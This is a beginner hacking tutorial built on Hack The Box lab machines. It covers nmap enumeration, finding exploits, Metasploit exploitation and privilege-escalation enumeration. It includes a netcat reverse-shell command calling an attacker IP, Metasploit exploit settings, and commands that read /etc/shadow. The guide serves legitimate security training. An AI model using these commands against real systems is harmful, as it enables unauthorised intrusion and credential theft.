---
description: >-
  The first part is a general introduction in the method that is hacking
  individual machines. How do we hackers go from no access to full access?
---

# Part 1 - How to hack

## What do you learn in this part?

* What is hacking?
* Four steps involved in hacking machines
* Using Metasploit to hack
* Hacking an actual machine!

**Boxes on HTB that are suitable for this part**

* Lame - 10.10.10.3
* Blue - 10.10.10.40

**If you are looking for a challenge**

* Granny
* Grandpa
* Legacy
* Optimum

## Using Hackthebox

In case you decided to skip the preparation stages, [Hackthebox](https://www.hackthebox.eu/invite) is the platform we will be using in this guide to allow you to practice your hacking skills.

Hacking machines on Hackthebox is somewhat similar to hacking in the real world. The HTB lab conssits of a gret chunk of independent boxes that are not connected to each other. That means each machine must be hacked individually. **The main goal of "hacking" is to gain command line / terminal access to the target machine with the highest privilege possible**. We usually achieve some form of command line access to target through what is called "code execution". That means you have found a way to execute arbitrary code on the target and hence you can start taking control over it. 

Usually, you gain access as a user or service account. The next challenge then becomes to escalate your privileges to the highest possible level. That means, if you are a regular user or a service account, you want to become administrator. Another flag is made available only through access with this level of privilege.

For each machine there is a flag that proves you have gained access to the machine, regardless of privilege. There are two flags: **user.txt** and **root.txt**. Getting access to the machine as a regular user  gives you the user flag, while getting access as `root` or `Administrator` access gives you both flags. The flags are simply unqiue MD5 strings that looks something like this:`bb1d10195b0a54e350cg015009a8095y`

#### Submitting flags on Hackthebox

After you have successfully compromised and gained access to a box, and found the flags, they must be submitted by pressing the two icons on the right in the machines panel on HTB. Flags provde that you completed the box and for each flag you get a certain amount of points, depending on the difficulty of the machine. Some boxes are built in such a way that compromising them might give you administrative access straight away. If so, you can grab both flags, because with administrative privileges we have full access to everything on the machine. 

![The two rightmost buttons on each machine opens a flag submission panel](.gitbook/assets/image%20%289%29.png)

Depending on whether the operating system is Windows or Linux, the flags on the machines are usually located in the places listed below. The `<username>` is the username of theu ser on the machine, which  is different on all the boxes. The Administrator user is usually not renamed, but it can happen that flaggs are hidden, so beware. 

**Windows**

* `C:\Documents and Settings\<username>\Desktop\user.txt` 
* `C:\Documents and Settings\Administrator\Desktop\root.txt`

**Linux**

* `/home/<username>/user.txt`
* `/root/root.txt`

## How to hack

This is a highly simplified approach to hacking invidiual boxes with four major steps that are explained in further detail below.

1. **Enumeration**
2. **Vulnerability analysis**
3. **Exploitation**
4. **Privilege escalation**

## **1 - Enumeration**

**Goal** - Gather information about the target

**Tools** - ****Nmap, web browser

**First things first -** Read carefully and write down everything you see on the screen. This may sound a bit weird, but we truly want you to write down any name, software, technology, email address or unknown factor that you discover when hacking. **The devil is the details**. The fact that you did not write down the name of that piece of software may lead you to an abrupt halt later down the road.

### F**ind IP address, open ports and services**

First, we want to find the IP address of the target. Since we are using HTB as a platform this is given in the left pane under _Machines_.

To discover ports, services and sometimes even the operating system we use the tool called `nmap`_._ It is a very powerful port scanner that will help us a lot. The basic syntax for nmap is: 

`nmap <ip-address>` - scans the provide dIP address for open TCP ports.

`nmap <ip-address> -A -n` - same as above. Additionally, the **-A** option enables OS and version detection, script scanning and traceroute. The **-n** option is to prevent nmap from performing DNS resolution, which will make the scan go slightly faster.

### How to read `nmap` results

```text
nmap -A -n 64.13.134.52
```

```text
Nmap scan report for 64.13.134.52
Host is up (0.045s latency).
Not shown: 993 filtered ports
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 1024 60:ac:4d:51:b1:cd:85:09:12:16:92:76:1d:5d:27:6e (DSA)
|_2048 2c:22:75:60:4b:c3:3b:18:a2:97:2c:96:7e:28:dc:dd (RSA)
25/tcp    closed smtp
53/tcp    open   domain
70/tcp    closed gopher
80/tcp    open   http    Apache httpd 2.2.3 ((CentOS))
|_html-title: Go ahead and ScanMe!
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
113/tcp   closed auth
31337/tcp closed Elite
Device type: general purpose
Running: Linux 2.6.X
OS details: Linux 2.6.13 - 2.6.31, Linux 2.6.18
Network Distance: 13 hops
TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
[Cut first 10 hops for brevity]
11  80.33 ms  layer42.car2.sanjose2.level3.net (4.59.4.78)
12  137.52 ms xe6-2.core1.svk.layer42.net (69.36.239.221)
13  44.15 ms  scanme.nmap.org (64.13.134.52)
Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
```

This is a pretty regular nmap scan and the output can look at bit daunting at first, but when getting used to reading nmap output, The result of this scan reveals that some ports are open. Each line that starts with a number indicates a port that nmap has identified with a status. Here you can see a mix of open and closed ports, and naturally we want to focus on those that are open.

 In the beginning, these ports may not mean that much to you. Most ports are connected to a service, and they are usually the same port connected to the same service, but not always. Below are some very common port to service associations that you will see. Only by hacking more boxes will you start recognizing services and know which ones are more likely targets than others.

* FTP - 20, 21
* SSH - 22
* HTTP\(S\) - 80, 443
* SMB - 139, 445

You want to learn as much as possible about the target and its services. If you can figure out version numbers, operating system, specific protocols, then all this is highly relevant information for you as a hacker. As you can see from the results above, port 22, 53 and 80 are open. That means we have SSH \(22\), a DNS server \(53\) and a web server \(80\).

**What now? -** Try to use `nmap` to discover open ports and services on your target

## **2 - Vulnerability analysis**

**Goal** - Detect vulnerabilities in services or applications running on the target

**Tools** - ****Google, searchsploit, CVE-details, Rapid7, Exploit-DB

### Finding vulnerabilities and exploits

Now that we know what ports are open and what services these oprt signify, let's try to see if any of them have public vulnerabilities and/or exploits.

As an example, lets have a look at the very famous EternalBlue vulnerability and exploit, named MS17-010. We will have a look at some common internet sources to learn more about this.

#### CVE-Details

CVE is a system for categorizing and  scoring the severity of vunlerabliities. The website CVE-details provides us with this information. This is what the Eternalblue vulneraility looks like on CVE-details. As you can see it has quite a high CVSS score, which usually means it can be easily exploited. Also, there are direct links to Metasploit modules, which is a good sign. That means there are prepared exploits for it available for you to use. Metasploit is a framework that contains tool for very easy hacking of machines. We are getting into Metasploit very soon, so just keep readnig.

![CVE-details for MS17-010, also known as EternalBlue](https://lh3.googleusercontent.com/v0mes2e-SCdJ45hLaJLpbbIykdTHGn2orgOJ58Xw9-IAmaBXD4cQgJgoLdyS5D_iZ5zddMD-Fl2mYpF-ORWIrV-JQgEDRuA4auKUoY3sNI5ljr6UgeyF67vPAwiehnl7OyUQXK2jUsM)

#### Rapid7

Rapid7 is the company that writes the Metasploit modules for thousands of exploits over the years, preparing them into a framework that is super easy to use. If you stumble upon an exploit and it has an associated Metasploit module you can rest assured its been tested and is legit. Here we can see how MS17-010 looks on Rapid7's own site. You may not understand the actual details of the exploit. Don't worry! Very few do, and you will soon discover it is possible to hack without understanding every sinlge detail.

![Rapid7 Metasploit module for MS17-010](https://lh3.googleusercontent.com/e3inunv4NBLXBlcP-LgDfEuTSpmRWEAoPlnM08CiA-jHPIDVccVIf2Q8JkcxDQocKw6eiMUvkP5RLREzpPXt_DAcpsB6Dxv9rRU3pM9hvQnXrWP2kexxDNC7x5vTSl3Y1uV1b5RIOic)

#### Exploit-DB

Let's go back to CVE-details and have a look at the manual exploit too. Sometimes, a Metasploit module is not necessarily the best choice and as a hacker you should strive to try exploiting boxes using both manual and automatic tools.

![Original exploit for MS17-010 on Exploit-DB](https://lh6.googleusercontent.com/hTd9RIUcQxb0qalEJG0R9ZoeLmM-i9-vKXrSB0dyUV1arnK1Q9oTOhkiiXrvHhn6L8eOyi_6WWmkhTxVR-iTZ4a7ozO8Ngq6QA2CziPfu5sYvw8tGlYOlOCrmTik1aPOqXFmwKxkW78)

Here you can see the original exploit code. You can download and run it as you please. It has a link back to the original CVE on CVE-details and it has been verified by the Exploit-DB team.

#### Reviewing the information

Finding vulnerabilities and exploits is generally easy, as most of it is pretty well documented online. It is extremely rare that we have to discover vulnerabiltiies ourselves. A very simple approach to discover vulnerabilities is to simply plug the name of the service and its version into your favorite search engine with the word "exploit" or "vulnerability" behind and see if anything shows up. Then review that information. See below for a simple example.

![A simple example of a google search for a service with a version number](.gitbook/assets/image%20%2840%29.png)

Perhaps the most important thing when assessing whether a service or box is vulnerable to something is to correlate whether the service version matches. Very often you will see that certain vulnerabilites and exploits only work on specific versions, and if the version on your target does not match, well then you can still try it, but often you will be shit out of luck. If that happens, you can try moving on to researching another service, or do more research to see if you can find something a bit rarer.

**What now?** - Try to find a vulnerability and an exploit that matches the service version you have identified.

## **3 - Exploitation**

**Goal -** Delivering a payload

**Tools -** Metasploit

In this step we have enumerated a target, we have found an open port with a vulnerable service and we're hoping to exploit it. That means our goal is executing commands on the target. So how do we get command execution or as we sometimes say, deliver a payload?

### **What is a payload?**

Before we move on it's important to know what a payload is. The payload is the actual information in a transmission, in our case it's a script that will provide us with some sort of reverse shell on the target.

Your payload is quite simply whatever code you decide to execute on the machine. It can be something simple, or it can be advanced. However, as we are hackers we want to take full advantage of the fact that we can execute commands on the target. So what we want to do is: **make the target machine connect back to our machine to get what we call a 'shell'.** Why do we want to do this? Because, when we have command execution on the remote box we can make it execute commands to make it connect back to us. However, the other way won't work because its not configured to accept a connection to establish a shell. Therefore in the illustration below, what's called a "normal shell" isn't possible, but since we control the 'client' part which is our Kali box we can open a port and make the server/target machine connect back. This way, we establish a connection where we can interact with the target.

To read more about payloads, visit:

[https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work](https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work)

### **So, what's a reverse shell?**

A reverse shell is the target host connecting back to our host! It sounds weird, but that's what we use the exploit for, we get past the defenses of the target host to deliver our payload - malicious code that leverage tools already on the system to connect back to our Kali Linux box. So how do we know that the target host is connecting back? How do we "catch" our shell?

![Reverse shell vs bind shell \(normal shell\)](https://lh4.googleusercontent.com/_u5bfPsl_tFbfHvQztajcQg9Xej7SOu7y3Cu3RTBJ5RGDzZAUQdt474UFHeN4_MOmbiO1iiPbDiHnU_NmuZIaHhwjFr-HLVic23LhqiaXElqS8oNh_vDkRw3cwOkcgmNYUn1-n1BiWg)

### **The art of listening**

An important concept in the world of hacking is listeners. Whenever we execute a payload, either through the Metasploit Framework \(MSF\) or manually, we need to listen for our shell to call back. We can do this in several ways, and perhaps the most common and simple way is using a tool called `netcat`, or `nc` for short. `nc` is a program used for reading from and writing to network connections, often called sockets. In the picture below we illustrate this. Let's imagine that we have successfully  delivered a payload to the target that runs the following command:

```text
nc 10.10.14.18 4444 -e /bin/sh
```

This executes netcat and connects to the IP address 10.10.14.18 on the port 4444, executing `/bin/sh` - one of the many shells on the linux system. If we did this without a listener, nothing would happen. We need something listening on our host with IP 10.10.14.18 on the port 4444. For this we use the following command:

```text
nc -lvp 4444
```

The -l is for listener, -v is for verbose and the -p is for port. Consequently this command starts a listener on your Kali machine on port 4444. Whenever the payload tries to connect to your IP address on this port with `nc` or a payload, it will "catch" the shell and you will get a terminal on the target. From there you are able to execute commands on the target. See the figure below for a basic example on how this works.

![Basic reverse shell and listener example](.gitbook/assets/image%20%2837%29.png)



**Metasploit Framework \(MSF\)**

As mentioned the metasploit framework and namely the msfconsole is a powerful tool that comes with premade exploits for many vulnerabilities. 

Metasploit is in fact not only a tool, but a powerful framework. It is a tool that makes it very easy to get into hacking, but you will soon discover its limitations too and realize that hacking requires more than just entering an IP address into a console and pressing enter. 

This will start loading the Metasploit console with its huge library of different payloads, exploits and fancy modules. MSF has a few different concepts that we need to be aware of:

* Listener - listen for an incoming connection
* Payload - executing commands on the target
* Meterpreter - important tools in MSF
* Use the help and search commands

To start the tool type the following into your terminal:

```text
systemctl start postgresql msfdb initmsfconsole
```

The above commands will start the postgresql service, initialize the database and start the console itself. However, this is only necessary the first time you start it. Usually you can open the Metasploit console with:

```text
msfconsole
```

Inside the console you have a lot of options, but let's continue trying to exploit the EternalBlue exploit we looked at in the earlier steps.

 To search for exploits, use the search command:

```text
search EternalBlue
```

You can also specify more parameters if you want, like NAME, TYPE and PLATFORM.

```text
msf > search name:smb type:exploit platform:windows
```

**So, how do I chose the right exploit?**

Choosing the right exploit can be hard or easy - sometimes your searches will display a ton of results, sometimes none. The approach to sort through many results are based on two parameters, assuming you've searched for only exploits - namely RANK and DISCLOSURE DATE. We want to try the exploits that are newest, and that ranks highest \(excellent being the highest\). Sometimes you'll end up trying them all and none will work - enumerate more!

**Modifying the exploits**

So you've searched and found an exploit - but we're not ready yet. First we need to select our exploit, like so:

```text
msf> use exploit/multi/samba/usermap_script
```

With the exploit selected we can modify it, like so:

```text
msf  (exploit/multi/samba/usermap_script) > show options
```

This will display something like this:

![Example of the options in a payload](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFWUjrWK-mc9zb5bbso%2F-LFgdoqNXAT6sDzPzLek%2F-LFgikUbRDXn6qLJtIBi%2Fe5f4c786-4709-4d66-bb9f-e605f788bc37.png?alt=media&token=37b6319f-61c7-49dd-8ea5-50aa830fe79d)

Name is the parameters that can be set, current settings will show you what they're currently set to and required shows you what needs to be set. Usually these exploits show up with the right port, but sometimes those have to be modified. Look at the enumeration you did - if the webserver is on port 5000, then your exploit targeting the webserver needs to be on port 5000.

In the example above RPORT is set correctly to 139, but we need to set the RHOST ourselves. This is our target, so we supply the IP of the target:

```text
msf exploit(usermap_script) > set rhost 10.10.10.3 
```

We also need to tell MSF some more stuff - what payload to use, what port to listen on and what IP-address it should connect back to. This is the same as the example used above. The MSF-module exploit will deliver the payload, but you need to supply it with the listener IP and PORT. To set this, do the following:

```text
msf exploit(usermap_script) > set LHOST 10.10.14.18 
lhost => 10.10.14.18
```

We can also use tun0 for our LHOST \(this is the VPN-adapter connected to HackTheBox in this case\):

```text
msf exploit(usermap_script) > set LHOST tun0
lhost => tun0
```

Then we need to tell it what port to listen on. An important point here is that we should try to use a port that isn't already in use to avoid problems. 4444 is such a port:

```text
msf exploit(usermap_script) > set LPORT 4444 
lport => 4444
```

Usually these exploit modules come with a premade payload, but we can also modify the payload. This, however, is something we will get more into when we get to part 2:

**Conclusion:** Look for ways to upload files and/or execute commands on the target

## **4 - Privilege escalation**

**Goal:** Becoming a root / Administrator user

**Tools:** Mad hacker skills

### I have a shell, what now? 

This is the time to start a new round of enumeration. You need to figure out where you are on a machine, who you are and starting working out a way to escalate your privileges. In certain cases it might not even be necessary, because you are already Administrator. The below list is not exahustive by any means and you will find more details about this subject in [Part 4 - Privilege escalation](part-4-privilege-escalation.md).

The `whoami` command displays what user you have access as.

```text
whoami
root
```

The `id` command shows what user and group id you have in addition to what groups you are member of.

```text
id
uid=0(root) gid=0(wheel)
```

 The `pwd` command identifies the working directory. That means, where you are located now.

```text
pwd
/home/chris
```

So how does this help us to escalate our privileges? It might not directly, but it tells us who we are. If we're already root, job done. If not, we've got work to do. Privilege escalation is more enumeration, but with different tools than we use for scanning the host.

**What are we looking for?**

First and foremost to find out as much about the target system as possible. This will vary based on the targets operating system, but  there are some common denominators, such as:

* What version is the operating system running?
* Which services are running?
* Any scheduled tasks?
* What programs are installed?
* What users exist?
* Anything out of the ordinary?

**Linux privilege escalation**

First things first. There's some things you should ALWAYS try. We can tell you one thing, but most of these things you'll learn as you go. Maybe the way to root is just one command? Well, next time you'll remember. One thing you need to do is check what commands you can run as sudo \(root\).

```text
sudo -l
```

How do we find what operating system is running?

```text
cat /etc/issue
cat /proc/version
```

To list running services, do:

```text
ps aux
```

To list all installed applications:

```text
ls -alh /usr/bin/
ls -alh /usr/sbin/
```

Scheduled tasks on Linux are called Cronjobs, and we can view them by looking at the crontab. There's a bunch of different places these hide based on the different flavors of linux, but they should all be located somewhere under the /etc/ folder.

```text
crontab -l
ls -al /etc/ | grep cron
cat /etc/cron*
cat /etc/crontab
```

When we want to find out more about what groups and users exist on Linux we can look in the /etc/ folder at the passwd and group files. We can also try to look at the shadow-file \(this is where the passwords are stored, not in the passwd ... I know, makes sense\)

```text
cat /etc/passwd
cat /etc/group
cat /etc/shadow
```

Finding anything out of the ordinary requires you to have experience. If you look at 100 targets, then anomalies in each one will start to appear more obvious, but you might miss these things now. Don't worry, that's what friends are for! One thing you will hear a lot of in this game is "try harder", but there's something to be said for trying smarter. Try as hard as you can do it on your own, but know when you're lost, and ask for help.

Finally, the go to guide for privelege escalation on Linux is the very famous [g0tmi1lk's guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/).



**Windows privilege escalation**

Now, Windows priv esc is somewhat different from Linux. Usually we use the Metasploit Framework and something called ["Local Exploit Suggester"](https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester). Using this is as simple as loading it and pointing it to the session. In this example we have a meterpreter shell and it's designated as session 1.

```text
msf > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set session 1
msf post(local_exploit_suggester) > run
```

And that's it. This will show us a list over metasploit-exploits that can be used to escalate our privilege. **For more, read** [**this** ](https://zero-day.io/windows-privilege-escalation-exploit-suggester/)**article.**

Now, some times we have to get manual. To find info on the operating system, run:

```text
systeminfo
```

To find other users we can use either a net command or look in the `C:\Users` directory.

```text
net users
dir /b /ad "C:\Users\"
```

To find groups and administrator we can also use net.

```text
net localgroup
net localgroup Administrators
```

To find installed  software we can look in the software folder or registry.

```text
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

To see what's running \(processes or services\):

```text
tasklist /svc
tasklist /v
net start
sc query
```

Finally, to find scheduled tasks we can do one of the following:

```text
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
```

**For more, read absolomb's excellent** [**Windows Privilege Escalation Guide**](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/)**.** 

That's it for now. We're getting deeper into privelege escalation in part 4. Remember, what we are doing now is enumerating more! We're looking for misconfigurations, unpatched or unsecure programs, services or folders. Anything that looks weird - poke it! Be curious. And when all else fails, ask the social channel.

## Start hacking boxes

If you've read the above you should be able to at least start trying to hack some machines on HTB. We recommend you start off with some of the "easy" ones, and depending on your skill level this might be very hard. The following boxes should be suitable for this level

* Lame - 10.10.10.3
* Legacy - 10.10.10.4
* Blue - 10.10.10.40

You can reset box through the Machines panel if somebody clutters it or if something is obviously wrong with it.

## **Useful commands**

* `nmap <ip>` - scan IP for open ports 
* `nmap -A -n <ip>` - scan IP and services for more info \(slower\)
* `searchsploit <application + version>` - search for exploits in the offline exploit database
* `msfconsole`- open the Metasploit console 
* `whoami` - display what user you are currently logged in as 
* `id` - display your user and group ID \(uid/guid\) 
* `pwd`- display where you are 
* `systeminfo` - display systeminfo on Windows 

## **I still have no idea where to start**

**Don't worry!** This is normal. Information overload is common when learning many new things at once. Try to break everything down into baby steps so it doesn't seem so overwhelming.

* Start with the IP address you got from HTB and check what operating system the machine is
* Use `nmap` to find open ports
* Look up the services that nmap give you on the internet
* Try to think: _What am I looking for?_
* Try to think: _Is this something I should look closer at?_
* Google the words you see on the screen

If you still struggle with the above to the extent where you can't even figure what to do at all, **don't worry.** **Hacking is difficult!** We recommend you take a step back and check out some of the hacking challenges from Overthewire. [Bandit](http://overthewire.org/wargames/bandit/), which is oriented around basic Linux commands is a very good place to start. Once you have at least a few of those down, you should feel slightly more comfortable with some of the concepts taught in this guide.

## I got started, but now I’m stuck

* Start from the beginning
* Fully enumerate
* Think like a user, then like a hacker
* admin admin
* Google everything
* Take a break and come back to it
* Try smarter
* Ask another hacker
* Look up the machine on the [HTB forum](https://forum.hackthebox.eu/)
* Ask us

Happy hacking!

